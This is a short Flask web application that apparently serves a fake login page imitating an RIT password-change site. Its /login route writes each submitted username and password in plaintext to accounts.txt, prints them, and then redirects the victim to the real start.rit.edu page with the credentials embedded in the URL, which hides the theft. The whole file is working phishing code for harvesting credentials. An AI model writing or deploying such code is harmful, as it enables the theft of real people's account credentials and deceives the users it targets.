from flask import Flask, render_template, request, redirect
app = Flask(__name__)

@app.route("/login",methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']
    with open("accounts.txt", "a") as myfile:
        myfile.write(username + " " + password + "\n")
    s = "https://"+username+":"+password+"@start.rit.edu/ChangePassword/"
    print(s)
    return redirect(s, code=302)

@app.route("/")
def index():
    return render_template('index.html')

if __name__ == '__main__':
   app.run('0.0.0.0')
